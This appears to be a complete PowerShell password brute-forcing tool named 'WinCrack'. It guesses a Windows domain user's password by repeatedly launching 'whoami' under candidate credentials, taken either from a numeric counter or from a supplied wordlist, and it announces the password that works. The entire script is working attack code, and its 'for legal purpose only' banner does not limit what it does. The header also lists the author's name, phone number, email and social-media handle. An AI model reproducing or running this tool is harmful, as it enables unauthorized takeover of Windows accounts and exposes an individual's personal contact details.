[console]::Title = "WinCrack"
"
    WINCRACK - fast windows password scanner tool

    ==============================================
    ============== by N47n@31 Wub3t ==============
    ============ phone: +251941226507 ============
    ========= email: natyw4122@gmail.com =========
    ============ facebook: naty.wubet ============
    ==============================================
    =========== for legal purpose only ===========
    ==============================================
    
    "
[console]::ForegroundColor = 'green'
function win
{
    function check ($cmd, $username, $password, $domain ) {
        try{
            $ps = new-object System.Diagnostics.ProcessStartInfo
            $ps.FileName = $cmd
            $ps.UseShellExecute = $false
            $ps.UserName = $username
            $pass = convertto-securestring $password -asplaintext -force
            $ps.Password = $pass
            $ps.Domain = $domain
            [System.Diagnostics.Process]::Start($ps) | out-null
            "1"
        }
        catch {
            "0"
        }

    }
    ""
    Write-Host "Windows user password attack"
    $dom = Read-Host -Prompt "Domain"
    $user = Read-Host -Prompt "Username"
    $list = Read-Host -Prompt "Password list ('1' for numberic attack)"
    if ($list -eq 1)
    {
        [int]$br = 0
        $i = 0
        $dt = (Get-Date).DateTime
        $hr = (Get-Date).Hour
        $min = (Get-Date).Minute
        $sec = (Get-Date).Second
        Write-Host "started at $dt"
        while ($br -le 1)
        {
            $run = check -username $user -password $i -domain $dom -cmd whoami
            if ($run -eq 1)
            {
                $dt = (Get-Date).DateTime
                if ($hr -eq ((Get-Date).Hour))
                {
                    if ($min -eq ((Get-Date).Minute))
                    {
                        if ($sec -eq ((Get-Date).Second))
                        {
                            $was = 0
                            $ws = "$was"+" Seconds"
                        } else {
                            $was = ((Get-Date).Second) - $sec
                            $ws = "$was"+" Seconds"
                        }
                    }
                }
        
                write-host "[Done] crack done at $dt by $i password
                time wasted: $ws" -ForegroundColor Green
                $b++;break;
            } else {
                $dt = (Get-Date).Second
                Write-Host "failed by $i --- $dt" -ForegroundColor Cyan
            }
            $i++
        }
    } else {
        [int]$br = 0
        $i = 0
        $gc = gc $list
        $ngc = $gc.count
        $dt = (Get-Date).DateTime
        $hr = (Get-Date).Hour
        $min = (Get-Date).Minute
        $sec = (Get-Date).Second
        Write-Host "started at $dt;
        scanning $ngc words from list"
        foreach ($tmp in ($gc))
        {
            $run = check -username $user -password $tmp -domain $dom -cmd whoami
            if ($run -eq 1)
            {
                $dt = (Get-Date).Second
                if ($run -eq 1)
                {
                    $dt = (Get-Date).DateTime
                    if ($hr -eq ((Get-Date).Hour))
                    {
                        if ($min -eq ((Get-Date).Minute))
                        {
                            if ($sec -eq ((Get-Date).Second))
                            {
                                $was = 0
                                $ws = "$was"+" Seconds"
                            } else {
                                $was = ((Get-Date).Second) - $sec
                                $ws = "$was"+" Seconds"
                            }
                        }
                    }
                }
                    write-host "[Done] crack done at $dt by $tmp password
                    time wasted: $ws" -ForegroundColor Green
                    $b++;break;
                } else {
                    $dt = (Get-Date).Second
                    Write-Host "($i) failed by $tmp --- to $user by $tmp on $dom $dt" -ForegroundColor Cyan
                }
                $i++
            }
        }
    
}

while ($true)
{
    win
}